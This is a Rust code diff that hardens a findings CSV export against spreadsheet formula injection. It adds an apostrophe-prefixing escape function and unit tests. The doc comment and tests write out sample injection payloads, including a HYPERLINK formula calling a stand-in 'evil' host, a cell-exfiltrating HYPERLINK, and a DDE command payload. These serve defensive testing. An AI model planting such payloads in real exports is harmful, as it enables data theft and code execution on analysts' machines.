@@ -4971,6 +4971,40 @@ async fn list_pg_findings(
 
 const EXPORT_MAX_ROWS: i64 = 100_000;
 
+/// Escape one CSV field, defending against both delimiter breakage and
+/// spreadsheet formula injection (CWE-1236).
+///
+/// `matched_text` in an exported finding is the content the scanner pulled out
+/// of an uploaded document — fully attacker-controlled. A spreadsheet app
+/// (Excel, Google Sheets, LibreOffice) evaluates any cell whose text begins
+/// with `=`, `+`, `-`, `@`, TAB or CR as a formula, so an exported finding like
+/// `=HYPERLINK("http://x/?"&A1)` or a legacy DDE payload executes the moment an
+/// analyst opens the CSV. RFC-4180 double-quoting does **not** prevent this: the
+/// app strips the surrounding quotes before evaluating the cell, so quoting
+/// alone (the previous behaviour here) left the injection wide open.
+///
+/// The fix is to force such a cell to text by prefixing a single quote, then
+/// apply normal RFC-4180 quoting for delimiters. The apostrophe is the standard
+/// OWASP mitigation and is consumed by the spreadsheet as a text marker.
+fn csv_field_safe(s: &str) -> String {
+    let dangerous_lead = s
+        .chars()
+        .next()
+        .is_some_and(|c| matches!(c, '=' | '+' | '-' | '@' | '\t' | '\r'));
+    let neutralized;
+    let body: &str = if dangerous_lead {
+        neutralized = format!("'{s}");
+        &neutralized
+    } else {
+        s
+    };
+    if body.contains(',') || body.contains('"') || body.contains('\n') || body.contains('\r') {
+        format!("\"{}\"", body.replace('"', "\"\""))
+    } else {
+        body.to_string()
+    }
+}
+
 #[derive(Deserialize)]
 struct ExportQuery {
     /// Output format: "csv" (default) or "json"
@@ -5111,11 +5145,7 @@ async fn findings_export(
         let duration_ms: Option<i32> = r.get("duration_ms");
 
         fn csv_field(s: &str) -> String {
-            if s.contains(',') || s.contains('"') || s.contains('\n') {
-                format!("\"{}\"", s.replace('"', "\"\""))
-            } else {
-                s.to_string()
-            }
+            csv_field_safe(s)
         }
 
         csv.push_str(&format!(
@@ -6201,6 +6231,62 @@ mod tests {
             StatusCode::FORBIDDEN,
             "operator must not pass an AdminAction gate",
         );
+    }
+}
+
+#[cfg(test)]
+mod csv_export_tests {
+    use super::*;
+
+    #[test]
+    fn neutralizes_formula_leads() {
+        // Each spreadsheet formula trigger must be forced to text with a
+        // leading apostrophe. matched_text is attacker-controlled, so this is
+        // the difference between an exported finding and code execution in the
+        // analyst's spreadsheet.
+        for payload in [
+            "=1+1",
+            "+1+1",
+            "-1+1",
+            "@SUM(A1)",
+            "=HYPERLINK(\"http://evil/\")",
+            "=cmd|'/c calc'!A1",
+        ] {
+            let out = csv_field_safe(payload);
+            assert!(
+                out.starts_with('\'') || out.starts_with("\"'"),
+                "formula lead not neutralized: {payload:?} -> {out:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn tab_and_cr_leads_are_neutralized() {
+        assert!(csv_field_safe("\tcmd").starts_with('\''));
+        // A leading CR also forces quoting because it contains \r.
+        assert!(csv_field_safe("\rcmd").starts_with("\"'"));
+    }
+
+    #[test]
+    fn ordinary_values_are_untouched() {
+        assert_eq!(csv_field_safe("4532015112830366"), "4532015112830366");
+        assert_eq!(csv_field_safe("Visa"), "Visa");
+        assert_eq!(csv_field_safe("jane.doe@x.com"), "jane.doe@x.com"); // '@' not leading
+    }
+
+    #[test]
+    fn delimiters_still_rfc4180_quoted() {
+        assert_eq!(csv_field_safe("a,b"), "\"a,b\"");
+        assert_eq!(csv_field_safe("a\"b"), "\"a\"\"b\"");
+        assert_eq!(csv_field_safe("a\nb"), "\"a\nb\"");
+    }
+
+    #[test]
+    fn formula_with_delimiter_is_both_prefixed_and_quoted() {
+        // `=1,2` must be prefixed (formula) AND quoted (comma), and the quoting
+        // must not re-expose the formula lead.
+        let out = csv_field_safe("=1,2");
+        assert_eq!(out, "\"'=1,2\"");
     }
 }
 
